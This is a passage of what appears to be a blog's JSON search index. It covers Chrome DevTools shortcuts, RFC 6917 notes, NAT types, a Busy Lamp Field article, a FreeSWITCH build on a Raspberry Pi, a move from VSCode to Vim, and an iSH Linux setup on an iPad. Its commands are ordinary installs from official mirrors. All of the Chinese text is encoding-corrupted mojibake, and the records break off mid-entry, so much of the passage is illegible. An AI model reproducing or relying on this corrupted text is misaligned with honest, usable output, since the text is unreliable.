ä¸Šä¸€ä¸ªå‘½ä»¤/è¡Œ å‘ä¸Šé”® å‘ä¸Šé”® ä¸‹ä¸€ä¸ªå‘½ä»¤/è¡Œ å‘ä¸‹é”® å‘ä¸‹é”® èšç„¦åˆ°æ§åˆ¶å° CtrlÂ +Â ` CtrlÂ +Â ` æ¸…é™¤æ§åˆ¶å° CtrlÂ +Â L CmdÂ +Â Kã€OptÂ +Â L å¤šè¡Œè¾“å…¥ ShiftÂ +Â Enter CtrlÂ +Â Return æ‰§è¡Œ Enter Return Device Mode Device Mode å¿«æ·é”® Windows Mac åŒæŒ‡å¼ åˆæ”¾å¤§å’Œç¼©å° ShiftÂ +Â æ»šåŠ¨ ShiftÂ +Â æ»šåŠ¨ æŠ“å±æ—¶ æŠ“å±å¿«æ·é”® Windows Mac åŒæŒ‡å¼ åˆæ”¾å¤§å’Œç¼©å° AltÂ +Â æ»šåŠ¨ã€CtrlÂ +Â ç‚¹å‡»å¹¶ç”¨ä¸¤ä¸ªæ‰‹æŒ‡æ‹–åŠ¨ OptÂ +Â æ»šåŠ¨ã€CmdÂ +Â ç‚¹å‡»å¹¶ç”¨ä¸¤ä¸ªæ‰‹æŒ‡æ‹–åŠ¨ æ£€æŸ¥å…ƒç´ å·¥å…· CtrlÂ +Â ShiftÂ +Â C CmdÂ +Â ShiftÂ +Â C ","permalink":"https://wdd.js.org/posts/2020/11/muk33s/","summary":"æœ¬é¡µä»‹ç» Chrome DevTools ä¸­æ‰€æœ‰é”®ç›˜å¿«æ·é”®çš„å‚è€ƒä¿¡æ¯ã€‚ä¸€äº›å¿«æ·é”®å…¨å±€å¯ç”¨ï¼Œè€Œå…¶ä»–å¿«æ·é”®ä¼šç‰¹å®šäºå•ä¸€é¢æ¿ã€‚æ‚¨ä¹Ÿå¯ä»¥åœ¨æç¤ºä¸­æ‰¾åˆ°å¿«æ·é”®ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨ DevTools çš„ UI å…ƒç´ ä¸Šå¯ä»¥æ˜¾ç¤ºå…ƒç´ çš„æç¤ºã€‚ å¦‚æœå…ƒç´ æœ‰å¿«æ·é”®ï¼Œæç¤ºå°†åŒ…å«å¿«æ·é”®ã€‚\nè®¿é—® DevTools è®¿é—® DevTools åœ¨ Windows ä¸Š åœ¨ Mac ä¸Š æ‰“å¼€ Developer Tools F12ã€CtrlÂ +Â ShiftÂ +Â I CmdÂ +Â OptÂ +Â I æ‰“å¼€/åˆ‡æ¢æ£€æŸ¥å…ƒç´ æ¨¡å¼å’Œæµè§ˆå™¨çª—å£ CtrlÂ +Â ShiftÂ +Â C CmdÂ +Â ShiftÂ +Â C æ‰“å¼€ Developer Tools å¹¶èšç„¦åˆ°æ§åˆ¶å° CtrlÂ +Â ShiftÂ +Â J CmdÂ +Â OptÂ +Â J æ£€æŸ¥æ£€æŸ¥å™¨ï¼ˆå–æ¶ˆåœé ç¬¬ä¸€ä¸ªåæŒ‰ï¼‰ CtrlÂ +Â ShiftÂ +Â I CmdÂ +Â OptÂ +Â I å…¨å±€é”®ç›˜å¿«æ·é”® ä¸‹åˆ—é”®ç›˜å¿«æ·é”®å¯ä»¥åœ¨æ‰€æœ‰ DevTools é¢æ¿ä¸­ä½¿ç”¨ï¼š","title":"Chrome é”®ç›˜å¿«æ·é”®å‚è€ƒ"},{"content":"when considered in conjunction with deployment architectures that include 1:M and M:N combinations of Application Servers and Media Servers\nMedia Resource Broker (MRB) entity, which manages the availability of Media Servers and the media resource demands of Application Servers. The document includes potential deployment options for an MRB and appropriate interfaces to Application Servers and Media Servers.\n","permalink":"https://wdd.js.org/posts/2020/11/ig536h/","summary":"when considered in conjunction with deployment architectures that include 1:M and M:N combinations of Application Servers and Media Servers\nMedia Resource Broker (MRB) entity, which manages the availability of Media Servers and the media resource demands of Application Servers. The document includes potential deployment options for an MRB and appropriate interfaces to Application Servers and Media Servers.","title":"RFC 6917 ç¬”è®°"},{"content":"4ç§NATç±»å‹ NATç±»å‹ æ¥æ”¶æ•°æ®å‰æ˜¯å¦è¦å…ˆå‘é€æ•°æ® æœ‰æ²¡æœ‰å¯èƒ½æ£€æµ‹ä¸‹ä¸€ä¸ªIP:PORTå¯¹æ˜¯å¦æ‰“å¼€ æ˜¯å¦é™åˆ¶å‘åŒ…ç›®çš„çš„IP:PORT å…¨é”¥å‹ no yes no é™åˆ¶é”¥å‹ yes yes only IP ç«¯å£é™åˆ¶å‹ yes yes yes å¯¹ç§°å‹ yes no yes NATç©¿é€ â€¢ STUN: Simple traversal of UDP over NATâ€¢ TURN: Traversal of UDP over Relay NATâ€¢ ALG: Application Layer Gatewaysâ€¢ MANUAL: Manual configuration (port forwarding)â€¢ UPNP: Universal Plug and Play\n","permalink":"https://wdd.js.org/posts/2020/11/nh68ws/","summary":"4ç§NATç±»å‹ NATç±»å‹ æ¥æ”¶æ•°æ®å‰æ˜¯å¦è¦å…ˆå‘é€æ•°æ® æœ‰æ²¡æœ‰å¯èƒ½æ£€æµ‹ä¸‹ä¸€ä¸ªIP:PORTå¯¹æ˜¯å¦æ‰“å¼€ æ˜¯å¦é™åˆ¶å‘åŒ…ç›®çš„çš„IP:PORT å…¨é”¥å‹ no yes no é™åˆ¶é”¥å‹ yes yes only IP ç«¯å£é™åˆ¶å‹ yes yes yes å¯¹ç§°å‹ yes no yes NATç©¿é€ â€¢ STUN: Simple traversal of UDP over NATâ€¢ TURN: Traversal of UDP over Relay NATâ€¢ ALG: Application Layer Gatewaysâ€¢ MANUAL: Manual configuration (port forwarding)â€¢ UPNP: Universal Plug and Play","title":"NAT"},{"content":"What Is a Busy Lamp Field (BLF) and Why Do You Need It? Busy lamp field is a presence indicator that allows you to see who in your organization is available (or not) for a phone call at any given time.\nThe term â€œbusy lamp fieldâ€ sounds a bit more involved than it really is. Put simply, it just means the ability to see who in your organization is available or not for a phone call at any given time.\nBusy Lamp Field Overview Maybe this analogy will help: Youâ€™re in New York City, and you need to flag down a yellow cab. (Letâ€™s pretend Uber isnâ€™t a thing for a minute.) The cabs with their roof light on are available. The cabs with their light off are occupied. If the cabâ€™s roof light is lit upâ€”but not the number, just the words â€œoff dutyâ€â€”theyâ€™re unavailable. Make sense? BLF is much the same, just for office phones: a light indication of whoâ€™s available to talk, whoâ€™s on the phone, and whoâ€™s â€œoff dutyâ€ for the moment. If youâ€™re familiar with the term â€œpresence,â€ BLF is the same thing, just specific to phone extensions. So why do you want these flashing lights in your line of sight? They allow you to monitor your coworkers in real time during the workday. Now, before you go all 1984 on us, let us clarify how this isnâ€™t a Big Brother type of monitoring: BLF is a vital tool for anyone whose job relies on phone callsâ€”think sales, reception, or support. Imagine having to physically check if someone was available for a call. Besides being a wildly inefficient way to spend your day, it also means the caller is left hanging on hold for however long it takes you to find your coworker. And what do you do if the coworker in question is in a different office, in a different state, or even in a different country? An active busy lamp field eliminates this problem altogether. Busy lamp field lets you know whoâ€™s available for a call transfer with a single glance.So how does this work in an actual office setting?Take Michael in Sales, for example. Heâ€™s on the phone with a customer who has a very specific question thatâ€™s best answered by Malcolm. Michael can glance at his OnSIP app screen and immediately see if Malcolm is available, on a call, or logged out at that exact moment. If available, Michael can immediately transfer the customer over to Malcolm. If unavailable, Michael can take a message, send the customer to Malcolmâ€™s voicemail, or suggest another agent who is available.\nBusy Lamp Field on Desk Phones: BLF Keys Whether your main desk phone knowledge comes from reruns of The Office or you use one every day, youâ€™ve undoubtedly seen tiny lights blinking on a panel of side buttons. While each phone is unique in its setup, nearly all desk phones have these buttonsâ€”BLF keysâ€”to the side of a small screen that you can connect to various extensions. Itâ€™s up to you which extensions you configure on your phoneâ€”other lines of your own, the coworkers you call the most, people to whom you tend to transfer phone calls, or even your boss. The BLF keys will show different colors, regularly green and red or orange, based on which extensions are currently in use so that you always have an overview of whoâ€™s available.If youâ€™d like to set up BLF on your desk phone, our Knowledgebase will help you configure the OnSIP specifics. Each phone has its own guide to colors, flashing status, and configuration, so follow the instructions provided by your particular phone model. BLF keys light up red to indicate a line is in use.\nBusy Lamp Field in the OnSIP Softphone App: BLF Presence The OnSIP app takes a desk phoneâ€™s busy lamp field and upgrades it for our current technological norms. Most of us here at OnSIP use our desktop app rather than physical phones. Because we have a contacts panel on the left side of the app, presence is automatically shown for everyone. As an added bonus, the apps also show you how long someoneâ€™s been on a call. Hereâ€™s how busy lamp field appears in the OnSIP app:\nGreen: Available Orange: AwayÂ Cerise: Busy Desk phones have a limited number of BLF keys to configure, so you have to pick and choose which colleagues will be visible to you or constantly switch it around based on daily needs. With the OnSIP softphone, everyone is visible in a single glance.To give you an idea of how they differ, hereâ€™s a comparison view of BLF as it appears in the app and on a desk phone: How BLF Affects Real-Time Communications WebRTC is a huge part of telecom innovations right now, and OnSIP is no exception. Weâ€™ve launched **sayso,Â **a web-based calling solution that lets your site visitors call or video chat straight from any webpage. Itâ€™s a fantastic business tool, but weâ€™ll let you read about that elsewhereâ€”this post is all about busy lamp field, after all.Real-time communication is a wonderful thing, and it wouldnâ€™t be quite as functional without busy lamp field. If sayso couldnâ€™t tell which agents were available to chat, how would it function? Exactly. (We assumed you answered, â€œIt wouldnâ€™tâ€ in your head.) We mentioned above how BLF is simply a phone-specific type of presenceâ€”it tells you that a phone is plugged in and can take a callâ€”and certainly the most common form of the feature.Presence factors into how sayso works but with a few key differences. Typical BLF isnâ€™t quite advanced enough for saysoâ€”it requires a more enhanced form of presence. We designed our proprietary presence system to take the typical BLF â€œavailableâ€ status to the next level and instead say, â€œYes, this person is sitting at their phone at this exact moment and is ready to take your call.â€ Presence is an essential part of sayso.Busy lamp field is an integral part of the workday for anyone who needs to call a coworker or whose job description heavily features the word â€œcall.â€ Whether you prefer a desktop interface or a physical handset balanced against your ear, you should be able to glance at your phone of choice and see which coworkers are available at any time. The name might be a mouthful, but thatâ€™s probably why itâ€™s just a visual cue anyway.\nå‚è€ƒèµ„æ–™ https://www.onsip.com/voip-resources/voip-fundamentals/what-is-a-busy-lamp-field-blf-and-why-do-you-need-it PDFé™„ä»¶ GXV32xx_broadworks_BLF_Guide.pdf 1501643005322.pdf Quick_Setup_BLF_List_on_Yealink_IP_Phones_with_BroadSoft_UC_ONE_v1.0.pdf ","permalink":"https://wdd.js.org/opensips/ch9/blf/","summary":"What Is a Busy Lamp Field (BLF) and Why Do You Need It? Busy lamp field is a presence indicator that allows you to see who in your organization is available (or not) for a phone call at any given time.\nThe term â€œbusy lamp fieldâ€ sounds a bit more involved than it really is. Put simply, it just means the ability to see who in your organization is available or not for a phone call at any given time.","title":"BLFæŒ‡ç¤ºç¯"},{"content":"1. å°†æºç åŒ…ä¸Šä¼ åˆ°æœåŠ¡å™¨, å¹¶è§£å‹ å®‰è£…ä¾èµ– apt update apt install autoconf \\ libtool \\ libtool-bin \\ libjpeg-dev \\ libsqlite3-dev \\ libspeex-dev libspeexdsp-dev \\ libldns-dev \\ libedit-dev \\ libtiff-dev \\ libavformat-dev libswscale-dev libsndfile-dev \\ liblua5.1-0-dev libcurl4-openssl-dev libpcre3-dev libopus-dev libpq-dev é…ç½® ./bootstrap.sh ./configure make make \u0026amp;\u0026amp; make install å‚è€ƒï¼šhttps://www.cnblogs.com/MikeZhang/p/RaspberryPiInstallFreeSwitch.html\n","permalink":"https://wdd.js.org/posts/2020/11/gtrrng/","summary":"1. å°†æºç åŒ…ä¸Šä¼ åˆ°æœåŠ¡å™¨, å¹¶è§£å‹ å®‰è£…ä¾èµ– apt update apt install autoconf \\ libtool \\ libtool-bin \\ libjpeg-dev \\ libsqlite3-dev \\ libspeex-dev libspeexdsp-dev \\ libldns-dev \\ libedit-dev \\ libtiff-dev \\ libavformat-dev libswscale-dev libsndfile-dev \\ liblua5.1-0-dev libcurl4-openssl-dev libpcre3-dev libopus-dev libpq-dev é…ç½® ./bootstrap.sh ./configure make make \u0026amp;\u0026amp; make install å‚è€ƒï¼šhttps://www.cnblogs.com/MikeZhang/p/RaspberryPiInstallFreeSwitch.html","title":"æ ‘è“æ´¾å®‰è£…fs 1.10"},{"content":"ä¸ºäº†èƒ½å¤Ÿåœ¨æ‰€æœ‰ç¯å¢ƒè¾¾åˆ°ä¸€è‡´ä¸”æè‡´çš„ç¼–ç¨‹ä½“éªŒã€‚æˆ‘å·²ç»å‡†å¤‡äº†å¥½é•¿çš„æ—¶é—´ï¼Œä»vscodeåˆ‡æ¢åˆ°vimä¸Šåšå¼€å‘ã€‚\næˆ‘çš„åˆ‡æ¢è®¡åˆ’åˆ†ä¸ºå¤šä¸ªé˜¶æ®µï¼š\nå°è¯•ï¼šä½¿ç”¨vimç¼–è¾‘å•ä¸ªæ–‡ä»¶ ç»ƒä¹ ï¼šåœ¨vscodeä¸Šå®‰è£…vimæ’ä»¶ï¼Œç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œæ„Ÿè§‰å¾ˆåˆ«æ‰­ã€‚ å¾˜å¾Šï¼šå°è¯•ä½¿ç”¨vimä½œä¸ºå¼€å‘ï¼Œç”¨äº†ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å‘ç°å¼€å‘é€Ÿåº¦ç›¸æ¯”äºvimä¸Šå¾ˆæ…¢ã€‚ç‰¹åˆ«æ˜¯å¤šæ–‡ä»¶ç¼–è¾‘ï¼Œæ–‡ä»¶åˆ›å»ºã€‚æ²¡æœ‰vscodeç¼–è¾‘å™¨çš„é‚£ç§æ–‡ä»¶ä¾§è¾¹æ ï¼Œæ„Ÿè§‰å†™ä»£ç ä¸å¤ªçœŸå®ï¼Œäº‘é‡Œé›¾é‡Œçš„æ„Ÿè§‰ã€‚ç„¶åæˆ‘å°±åˆåˆ‡æ¢åˆ°vscodeä¸Šå¼€å‘ã€‚ ç²¾è¿›ï¼šæˆ‘ä¸€ç›´è®¤ä¸ºæˆ‘vimå·²ç»å­¦çš„å·®ä¸å¤šäº†ï¼Œä½†æ˜¯ç”¨vimçš„æ—¶å€™ï¼Œæ€»æ˜¯æ„Ÿè§‰ä½¿ä¸ä¸ŠåŠ²ã€‚æˆ‘è§‰å¾—æˆ‘æ²¡æœ‰ç³»ç»Ÿçš„å­¦ä¹ vimã€‚ç„¶åæˆ‘å°±å»æ‰¾äº†vimæ–¹é¢çš„ä¹¦ç±ã€Švimå®ç”¨æŠ€å·§ã€‹ã€‚è¿™æœ¬ä¹¦æˆ‘çœ‹è¿‡ç¬¬ä¸€éï¼Œæˆ‘è§‰å¾—è‡ªå·±ä¹‹å‰å¯¹vimçš„ç†è§£å¤ªè¿‡è‚¤æµ…ã€‚ç„¶åæˆ‘å°±æ‰¾æœºä¼šä»ä¹¦ä¸­å­¦ä¹ çš„æŠ€å·§ç»ƒä¹ å†™ä»£ç ã€‚è¿™æœ¬ä¹¦æˆ‘çœ‹äº†ä¸ä¸‹äºä¸‰éï¼Œæ¯æ¬¡çœ‹éƒ½æœ‰æ”¶è·ã€‚æ¯æ¯é‡åˆ°å›°æƒ‘çš„åœ°æ–¹ï¼Œæˆ‘å°±ä¼šéšæ‰‹å»æŸ¥æŸ¥ã€‚ç„¶ååšæ€»ç»“ã€‚ åˆ‡æ¢ï¼šä»ä»Šå¹´åŒåä¸€ï¼Œæˆ‘å¼€å§‹ä½¿ç”¨vimåšå¼€å‘ï¼Œç›´åˆ°ä»Šå¤©ï¼Œæˆ‘ä¸€ç›´éƒ½æ²¡æœ‰ä½¿ç”¨vscode, å¹¶ä¸”æˆ‘ä¹ŸæŠŠvscodeå¸è½½äº†ã€‚æˆ‘ä¹‹æ‰€ä»¥æ•¢äºå¸è½½vscode, æ˜¯å› ä¸ºæˆ‘è§‰å¾—æˆ‘åœ¨vimä¸Šå¼€å‘çš„æ•ˆç‡ï¼Œå·²ç»é«˜äºvscodeã€‚ ç†Ÿç»ƒè¿ç”¨vimä¹‹åï¼Œæˆ‘å‘ç°åœ¨vimä¸Šåˆ‡æ¢æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶è¿˜æ˜¯åˆ›å»ºæ–‡ä»¶ï¼Œé€Ÿåº¦éå¸¸å¿«ï¼Œå®Œå…¨ä¸éœ€è¦é¼ æ ‡ç‚¹å‡»ã€‚\né™¤äº†æ²¡æœ‰å³è¾¹çš„ä»£ç é¢„è§ˆè§†å›¾ï¼ŒvimåŠŸèƒ½éƒ½æœ‰ã€‚è€Œä¸”æˆ‘è¶Šç”¨è¶Šè§‰å¾—vimçš„netrwæ’ä»¶è¦æ¯”vscodeå·¦è¾¹æ çš„æ–‡ä»¶æ ‘çª—å£å¥½ç”¨ã€‚\nè¿˜æœ‰ä»£ç æœç´¢ï¼Œæˆ‘ä½¿ç”¨äº†ackï¼Œ ç”¨è¿™ä¸ªå‘½ä»¤æœç´¢å…³é”®è¯ï¼Œç®€ç›´å¿«çš„é£èµ·ã€‚\n","permalink":"https://wdd.js.org/vim/from-vscode-to-vim/","summary":"ä¸ºäº†èƒ½å¤Ÿåœ¨æ‰€æœ‰ç¯å¢ƒè¾¾åˆ°ä¸€è‡´ä¸”æè‡´çš„ç¼–ç¨‹ä½“éªŒã€‚æˆ‘å·²ç»å‡†å¤‡äº†å¥½é•¿çš„æ—¶é—´ï¼Œä»vscodeåˆ‡æ¢åˆ°vimä¸Šåšå¼€å‘ã€‚\næˆ‘çš„åˆ‡æ¢è®¡åˆ’åˆ†ä¸ºå¤šä¸ªé˜¶æ®µï¼š\nå°è¯•ï¼šä½¿ç”¨vimç¼–è¾‘å•ä¸ªæ–‡ä»¶ ç»ƒä¹ ï¼šåœ¨vscodeä¸Šå®‰è£…vimæ’ä»¶ï¼Œç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œæ„Ÿè§‰å¾ˆåˆ«æ‰­ã€‚ å¾˜å¾Šï¼šå°è¯•ä½¿ç”¨vimä½œä¸ºå¼€å‘ï¼Œç”¨äº†ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å‘ç°å¼€å‘é€Ÿåº¦ç›¸æ¯”äºvimä¸Šå¾ˆæ…¢ã€‚ç‰¹åˆ«æ˜¯å¤šæ–‡ä»¶ç¼–è¾‘ï¼Œæ–‡ä»¶åˆ›å»ºã€‚æ²¡æœ‰vscodeç¼–è¾‘å™¨çš„é‚£ç§æ–‡ä»¶ä¾§è¾¹æ ï¼Œæ„Ÿè§‰å†™ä»£ç ä¸å¤ªçœŸå®ï¼Œäº‘é‡Œé›¾é‡Œçš„æ„Ÿè§‰ã€‚ç„¶åæˆ‘å°±åˆåˆ‡æ¢åˆ°vscodeä¸Šå¼€å‘ã€‚ ç²¾è¿›ï¼šæˆ‘ä¸€ç›´è®¤ä¸ºæˆ‘vimå·²ç»å­¦çš„å·®ä¸å¤šäº†ï¼Œä½†æ˜¯ç”¨vimçš„æ—¶å€™ï¼Œæ€»æ˜¯æ„Ÿè§‰ä½¿ä¸ä¸ŠåŠ²ã€‚æˆ‘è§‰å¾—æˆ‘æ²¡æœ‰ç³»ç»Ÿçš„å­¦ä¹ vimã€‚ç„¶åæˆ‘å°±å»æ‰¾äº†vimæ–¹é¢çš„ä¹¦ç±ã€Švimå®ç”¨æŠ€å·§ã€‹ã€‚è¿™æœ¬ä¹¦æˆ‘çœ‹è¿‡ç¬¬ä¸€éï¼Œæˆ‘è§‰å¾—è‡ªå·±ä¹‹å‰å¯¹vimçš„ç†è§£å¤ªè¿‡è‚¤æµ…ã€‚ç„¶åæˆ‘å°±æ‰¾æœºä¼šä»ä¹¦ä¸­å­¦ä¹ çš„æŠ€å·§ç»ƒä¹ å†™ä»£ç ã€‚è¿™æœ¬ä¹¦æˆ‘çœ‹äº†ä¸ä¸‹äºä¸‰éï¼Œæ¯æ¬¡çœ‹éƒ½æœ‰æ”¶è·ã€‚æ¯æ¯é‡åˆ°å›°æƒ‘çš„åœ°æ–¹ï¼Œæˆ‘å°±ä¼šéšæ‰‹å»æŸ¥æŸ¥ã€‚ç„¶ååšæ€»ç»“ã€‚ åˆ‡æ¢ï¼šä»ä»Šå¹´åŒåä¸€ï¼Œæˆ‘å¼€å§‹ä½¿ç”¨vimåšå¼€å‘ï¼Œç›´åˆ°ä»Šå¤©ï¼Œæˆ‘ä¸€ç›´éƒ½æ²¡æœ‰ä½¿ç”¨vscode, å¹¶ä¸”æˆ‘ä¹ŸæŠŠvscodeå¸è½½äº†ã€‚æˆ‘ä¹‹æ‰€ä»¥æ•¢äºå¸è½½vscode, æ˜¯å› ä¸ºæˆ‘è§‰å¾—æˆ‘åœ¨vimä¸Šå¼€å‘çš„æ•ˆç‡ï¼Œå·²ç»é«˜äºvscodeã€‚ ç†Ÿç»ƒè¿ç”¨vimä¹‹åï¼Œæˆ‘å‘ç°åœ¨vimä¸Šåˆ‡æ¢æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶è¿˜æ˜¯åˆ›å»ºæ–‡ä»¶ï¼Œé€Ÿåº¦éå¸¸å¿«ï¼Œå®Œå…¨ä¸éœ€è¦é¼ æ ‡ç‚¹å‡»ã€‚\né™¤äº†æ²¡æœ‰å³è¾¹çš„ä»£ç é¢„è§ˆè§†å›¾ï¼ŒvimåŠŸèƒ½éƒ½æœ‰ã€‚è€Œä¸”æˆ‘è¶Šç”¨è¶Šè§‰å¾—vimçš„netrwæ’ä»¶è¦æ¯”vscodeå·¦è¾¹æ çš„æ–‡ä»¶æ ‘çª—å£å¥½ç”¨ã€‚\nè¿˜æœ‰ä»£ç æœç´¢ï¼Œæˆ‘ä½¿ç”¨äº†ackï¼Œ ç”¨è¿™ä¸ªå‘½ä»¤æœç´¢å…³é”®è¯ï¼Œç®€ç›´å¿«çš„é£èµ·ã€‚","title":"ä»VSCodeåˆ‡æ¢åˆ°VIM"},{"content":"æˆ‘åœ¨å®¶é‡Œçš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†æ—¶é—´ç”¨iPadè¿œç¨‹è¿æ¥åˆ°æœåŠ¡ç«¯åšå¼€å‘ã€‚è™½ç„¶ä¹Ÿæ˜¯è›®æ–¹ä¾¿çš„ï¼Œä½†æ˜¯æ¯å¹´éƒ½éœ€è¦ä¹°ä¸ªäº‘æœåŠ¡å™¨ï¼Œä¹Ÿæ˜¯ä¸€ç¬”èŠ±è´¹ï¼Œæœ€è¿‘çœ‹åˆ°ä¸€ä¸ªApp, å¯ä»¥åœ¨æ‰‹æœºä¸Šç›´æ¥è¿è¡Œä¸€ä¸ªLinuxç¯å¢ƒï¼Œè¯•äº†ä¸€ä¸‹ï¼Œæœç„¶è¿˜ä¸é”™ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ã€‚\nstep1: ä¸‹è½½iSh step2: å®‰è£…apk è¿™ä¸ªè½¯ä»¶ä¸‹è½½ä¹‹åæ‰“å¼€ï¼Œå°±ç›´æ¥è¿›åˆ°shellç•Œé¢ï¼Œè™½ç„¶å®ƒæ˜¯ä¸€ä¸ªåŸºäºalpineçš„ç¯å¢ƒï¼Œä½†æ˜¯æ²¡æœ‰apkï¼Œ æˆ‘ä»¬éœ€è¦æ‰‹å·¥å®‰è£…è¿™ä¸ªåŒ…ç®¡ç†å·¥å…·ã€‚\nwget -qO- http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86/apk-tools-static-2.10.5-r1.apk | tar -xz sbin/apk.static \u0026amp;\u0026amp; ./sbin/apk.static add apk-tools \u0026amp;\u0026amp; rm sbin/apk.static \u0026amp;\u0026amp; rmdir sbin 2\u0026gt; /dev/null æ¸©é¦¨æç¤ºï¼šåœ¨iShçš„å³ä¸‹è§’ï¼Œæœ‰ä¸ªæŒ‰é’®æ˜¯ç²˜è´´æŒ‰é’®ã€‚\nstep3: apk update è™½ç„¶å®‰è£…äº†apk, ä½†æ˜¯ä¸æ›´æ–°çš„è¯ï¼Œå¯èƒ½å¾ˆå¤šå®‰è£…åŒ…éƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æœ€å¥½å…ˆæ›´æ–°ã€‚\nåœ¨æ›´æ–°ä¹‹å‰ã€‚æœ€å¥½æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ŒæŠŠapkçš„æºæ¢æˆæ¸…åçš„ï¼Œè¿™æ ·ä¹‹åçš„å®‰è£…è½¯ä»¶ä¼šæ¯”è¾ƒå¿«ç‚¹ã€‚\nsed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g\u0026#39; /etc/apk/repositories apk update step4: å®‰è£…å„ç§å¼€å‘å·¥å…· git zsh tmux vim\u0026hellip; apk add git zsh tmux vim step5: å®‰è£…oh-my-zsh è¿™æ˜¯å¿…ä¸å¯å°‘çš„ç¥å™¨ å› ä¸ºä»githubä¸Šå…‹éš†oh-my-zshå¯èƒ½ä¼šå¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘ç”¨äº†ç äº‘ä¸Šçš„ä¸€ä¸ªä»“åº“ã€‚ è¿™æ ·é€Ÿåº¦å°±ä¼šå¾ˆå¿«äº†ã€‚\ngit clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc chsh -s $(which zsh) step6: å®‰è£…nodejs python golangç­‰ã€‚ apk add nodejs python3 ä¸‹é¢çœ‹åˆ°è¾“å‡ºäº†nodejså’Œpythonçš„ç‰ˆæœ¬ï¼Œè¯´æ˜å®‰è£…æˆåŠŸã€‚å¦å¤–ishæ”¯æŒæ¢è‚¤çš„ã€‚ä¹‹å‰çš„ç™½è‰²çš„ï¼Œä¸‹é¢çš„æ˜¯é»‘è‰²çš„ã€‚\nstep7: vimå†™ä¸ªhello worldå§ vim index.html\nstep8: ç›‘å¬ç«¯å£å¯ä»¥å—ï¼Ÿ å†™webæœåŠ¡å™¨å°±ä¸èµ˜è¿°äº†ï¼Œç›´æ¥ç”¨pythonè‡ªå¸¦çš„é™æ€æ–‡ä»¶æœåŠ¡å™¨å§ã€‚\npython3 -m http.server è¿™ä¼šæ‰“å¼€ä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œç›‘å¬åœ¨8000ç«¯å£ã€‚\næˆ‘ä»¬æ‰“å¼€è‡ªå¸¦çš„safariæµè§ˆå™¨çœ‹çœ‹ï¼Œèƒ½å¦è®¿é—®è¿™ä¸ªé¡µé¢ã€‚\nhello worldå‡ºç°ã€‚å®Œç¾ï¼ï¼ï¼\nstep9: åå°è¿è¡Œ åå°è¿è¡Œçš„æ€è·¯æ˜¯ï¼š\nä½¿ç”¨tmux åˆ›å»ºä¸€ä¸ªæ–°çš„sesssion è¿™è¿™ä¸ªsessionä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ä¸‹é¢çš„å‘½ä»¤å®é™…ä¸Šæ˜¯è·å–ä½ çš„ä½ç½®ä¿¡æ¯ï¼Œå½“Appåˆ‡åˆ°åå°æ—¶ï¼Œä½ç½®åœ¨åå°åˆ·æ–°ï¼Œä¿è¯ishèƒ½å¤Ÿåå°è¿è¡Œã€‚å½“ç„¶è¿™éœ€è¦ç»™äºˆä½ç½®æƒé™ã€‚ä½ ä¹Ÿå¯ä»¥æ”¶å·¥è¾“å…¥ cat /dev/locationÂ çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ cat /dev/location \u0026gt; /dev/null \u0026amp; FAQ æœ‰äº›äººä¼šé—®ï¼Œishä¸æ”¯æŒå¤šæ ‡ç­¾é¡µï¼Œæ€ä¹ˆåŒæ—¶åšå¾ˆå¤šäº‹æƒ…å‘¢ï¼Ÿ é—®è¿™ä¸ªé—®é¢˜ï¼Œè¯´æ˜ä½ è¿˜æ²¡ç”¨è¿‡tmuxè¿™ä¸ªå·¥å…·ï¼Œå»ºè®®ä½ å…ˆå­¦å­¦tmuxã€‚ ","permalink":"https://wdd.js.org/posts/2020/11/kfl9zd/","summary":"æˆ‘åœ¨å®¶é‡Œçš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†æ—¶é—´ç”¨iPadè¿œç¨‹è¿æ¥åˆ°æœåŠ¡ç«¯åšå¼€å‘ã€‚è™½ç„¶ä¹Ÿæ˜¯è›®æ–¹ä¾¿çš„ï¼Œä½†æ˜¯æ¯å¹´éƒ½éœ€è¦ä¹°ä¸ªäº‘æœåŠ¡å™¨ï¼Œä¹Ÿæ˜¯ä¸€ç¬”èŠ±è´¹ï¼Œæœ€è¿‘çœ‹åˆ°ä¸€ä¸ªApp, å¯ä»¥åœ¨æ‰‹æœºä¸Šç›´æ¥è¿è¡Œä¸€ä¸ªLinuxç¯å¢ƒï¼Œè¯•äº†ä¸€ä¸‹ï¼Œæœç„¶è¿˜ä¸é”™ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ã€‚\nstep1: ä¸‹è½½iSh step2: å®‰è£…apk è¿™ä¸ªè½¯ä»¶ä¸‹è½½ä¹‹åæ‰“å¼€ï¼Œå°±ç›´æ¥è¿›åˆ°shellç•Œé¢ï¼Œè™½ç„¶å®ƒæ˜¯ä¸€ä¸ªåŸºäºalpineçš„ç¯å¢ƒï¼Œä½†æ˜¯æ²¡æœ‰apkï¼Œ æˆ‘ä»¬éœ€è¦æ‰‹å·¥å®‰è£…è¿™ä¸ªåŒ…ç®¡ç†å·¥å…·ã€‚\nwget -qO- http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86/apk-tools-static-2.10.5-r1.apk | tar -xz sbin/apk.static \u0026amp;\u0026amp; ./sbin/apk.static add apk-tools \u0026amp;\u0026amp; rm sbin/apk.static \u0026amp;\u0026amp; rmdir sbin 2\u0026gt; /dev/null 